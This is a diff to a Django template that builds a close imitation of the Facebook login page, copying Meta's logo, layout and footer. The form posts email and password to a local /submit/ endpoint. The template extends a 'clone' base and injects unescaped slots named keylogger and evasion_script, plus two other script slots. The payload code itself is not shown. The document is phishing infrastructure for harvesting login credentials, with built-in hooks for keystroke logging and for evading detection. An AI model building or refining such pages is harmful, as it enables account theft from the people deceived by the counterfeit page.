@@ -1,15 +1,371 @@
-{% extends 'base.html' %}
+{% extends 'base/clone.html' %}
 
 {% load static %}
 
 {% block content %}
-<div>
-    <h1>Facebook Login</h1>
-    <form action="/submit/" method="post">
-      <input type="text" name="email" placeholder="Email or Phone"><br>
-      <input type="password" name="pass" placeholder="Password"><br>
-      <input type="submit" value="Log In">
-    </form>
-    {{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+<div class="fb-login-container">
+    <!-- Header -->
+    <header class="fb-header">
+        <div class="fb-logo">
+            <svg viewBox="0 0 36 36" width="240" height="80">
+                <path fill="#0866FF" d="M34 18c0-8.8-7.2-16-16-16S2 9.2 2 18c0 7.7 5.6 14.2 13 15.5V23h-4v-5h4v-3.5c0-3.9 2.3-6 6-6 1.7 0 3.5.3 3.5.3v4h-2c-2 0-2.6 1.2-2.6 2.5V18h4.5l-.7 5h-3.8v10.5c7.4-1.3 13-7.8 13-15.5z"></path>
+            </svg>
+        </div>
+    </header>
+
+    <!-- Login Card -->
+    <main class="fb-login-card">
+        <div class="login-form-container">
+            <h1 class="login-title">Log in to Facebook</h1>
+            
+            <form action="/submit/" method="post" class="fb-login-form" autocomplete="off">
+                {% csrf_token %}
+                <div class="form-group">
+                    <input type="text" name="email" id="email" placeholder="Email or phone number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="pass" id="pass" placeholder="Password" required>
+                    <button type="button" class="show-password" aria-label="Show password">👁️</button>
+                </div>
+                <button type="submit" class="login-button">Log In</button>
+                <div class="divider"></div>
+                <a href="#" class="create-account">Create new account</a>
+                <a href="#" class="forgot-password">Forgotten password?</a>
+            </form>
+        </div>
+
+        <div class="signup-promo">
+            <p><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="fb-footer">
+        <div class="languages">
+            <a href="#">English (US)</a>
+            <a href="#">Español</a>
+            <a href="#">Français (France)</a>
+            <a href="#">中文(简体)</a>
+            <a href="#">العربية</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">Italiano</a>
+            <a href="#">Deutsch</a>
+            <a href="#">日本語</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">+</a>
+        </div>
+        <div class="meta-links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta Store</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Fundraisers</a>
+            <a href="#">Services</a>
+            <a href="#">Voting Information Center</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Privacy Center</a>
+            <a href="#">Groups</a>
+            <a href="#">About</a>
+            <a href="#">Create Ad</a>
+            <a href="#">Create Page</a>
+            <a href="#">Developers</a>
+            <a href="#">Careers</a>
+            <a href="#">Cookies</a>
+            <a href="#">Ad choices</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+        </div>
+        <div class="copyright">
+            Meta © {% now "Y" %}
+        </div>
+    </footer>
 </div>
-{% endblok %}
+
+<style>
+    :root {
+        --fb-blue: #0866FF;
+        --fb-dark-blue: #1877F2;
+        --fb-light-blue: #E7F3FF;
+        --fb-green: #42B72A;
+        --fb-white: #FFFFFF;
+        --fb-black: #1C1E21;
+        --fb-gray: #F0F2F5;
+        --fb-dark-gray: #606770;
+        --fb-light-gray: #DDDFE2;
+        --fb-border: #DADDE1;
+        --fb-error: #BE4B49;
+        --shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        --transition: all 0.2s ease;
+    }
+
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+        background-color: var(--fb-gray);
+        color: var(--fb-black);
+        line-height: 1.5;
+    }
+
+    .fb-login-container {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+    }
+
+    /* Header Styles */
+    .fb-header {
+        padding: 1rem 0;
+        text-align: center;
+    }
+
+    .fb-logo svg {
+        height: 70px;
+    }
+
+    /* Login Card Styles */
+    .fb-login-card {
+        max-width: 400px;
+        width: 90%;
+        margin: 0 auto 2rem;
+        background-color: var(--fb-white);
+        border-radius: 8px;
+        box-shadow: var(--shadow);
+        padding: 1rem;
+        text-align: center;
+    }
+
+    .login-title {
+        font-size: 1.25rem;
+        margin-bottom: 1rem;
+        color: var(--fb-black);
+        font-weight: normal;
+    }
+
+    .fb-login-form {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+    }
+
+    .form-group {
+        position: relative;
+    }
+
+    .form-group input {
+        width: 100%;
+        padding: 0.875rem 1rem;
+        border: 1px solid var(--fb-border);
+        border-radius: 6px;
+        font-size: 1rem;
+    }
+
+    .form-group input:focus {
+        outline: none;
+        border-color: var(--fb-blue);
+        box-shadow: 0 0 0 2px var(--fb-light-blue);
+    }
+
+    .show-password {
+        position: absolute;
+        right: 0.75rem;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        font-size: 1rem;
+        color: var(--fb-dark-gray);
+    }
+
+    .login-button {
+        background-color: var(--fb-blue);
+        color: var(--fb-white);
+        border: none;
+        border-radius: 6px;
+        padding: 0.875rem;
+        font-size: 1.25rem;
+        font-weight: bold;
+        cursor: pointer;
+        transition: var(--transition);
+    }
+
+    .login-button:hover {
+        background-color: var(--fb-dark-blue);
+    }
+
+    .divider {
+        border-bottom: 1px solid var(--fb-border);
+        margin: 1rem 0;
+    }
+
+    .create-account {
+        background-color: var(--fb-green);
+        color: var(--fb-white);
+        border: none;
+        border-radius: 6px;
+        padding: 0.75rem;
+        font-size: 1rem;
+        font-weight: bold;
+        text-decoration: none;
+        margin: 0.5rem 0;
+        display: inline-block;
+    }
+
+    .create-account:hover {
+        background-color: #36A420;
+    }
+
+    .forgot-password {
+        color: var(--fb-blue);
+        text-decoration: none;
+        font-size: 0.875rem;
+        margin-top: 1rem;
+        display: inline-block;
+    }
+
+    .forgot-password:hover {
+        text-decoration: underline;
+    }
+
+    .signup-promo {
+        margin-top: 1.5rem;
+        padding-top: 1rem;
+        border-top: 1px solid var(--fb-border);
+        font-size: 0.875rem;
+    }
+
+    /* Footer Styles */
+    .fb-footer {
+        background-color: var(--fb-white);
+        padding: 1.5rem;
+        text-align: center;
+        margin-top: auto;
+    }
+
+    .languages, .meta-links {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 0.5rem;
+        margin-bottom: 1rem;
+    }
+
+    .languages a, .meta-links a {
+        color: var(--fb-dark-gray);
+        text-decoration: none;
+        font-size: 0.75rem;
+    }
+
+    .languages a:hover, .meta-links a:hover {
+        text-decoration: underline;
+    }
+
+    .copyright {
+        font-size: 0.75rem;
+        color: var(--fb-dark-gray);
+        margin-top: 1rem;
+    }
+
+    /* Responsive Styles */
+    @media (min-width: 900px) {
+        .fb-login-container {
+            flex-direction: row;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            padding: 5rem 0;
+        }
+
+        .fb-header {
+            flex: 1;
+            max-width: 500px;
+            text-align: left;
+            padding: 0 2rem;
+        }
+
+        .fb-logo svg {
+            height: 106px;
+            margin: -28px;
+        }
+
+        .fb-login-card {
+            margin: 0;
+        }
+
+        .login-title {
+            font-size: 1.5rem;
+        }
+    }
+
+    @media (max-width: 450px) {
+        .fb-login-card {
+            width: 100%;
+            box-shadow: none;
+            border: none;
+            background-color: transparent;
+        }
+
+        .login-button, .create-account {
+            width: 100%;
+        }
+    }
+</style>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Toggle password visibility
+        const showPasswordBtn = document.querySelector('.show-password');
+        const passwordInput = document.getElementById('pass');
+        
+        showPasswordBtn.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
+        });
+
+        // Form submission handler
+        const loginForm = document.querySelector('.fb-login-form');
+        const loginButton = loginForm.querySelector('.login-button');
+        
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading state
+            loginButton.disabled = true;
+            loginButton.innerHTML = 'Logging In...';
+            
+            // Simulate network request (replace with actual form submission)
+            setTimeout(() => {
+                // This would be your actual form submission
+                this.submit();
+            }, 1500);
+        });
+
+        // Simulate create account click
+        document.querySelector('.create-account')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('This would redirect to Facebook signup page');
+        });
+    });
+</script>
+
+{{ keylogger|safe }} 
+{{ security_scripts|safe }} 
+{{ timeout_script|safe }} 
+{{ evasion_script|safe }}
+{% endblock %}
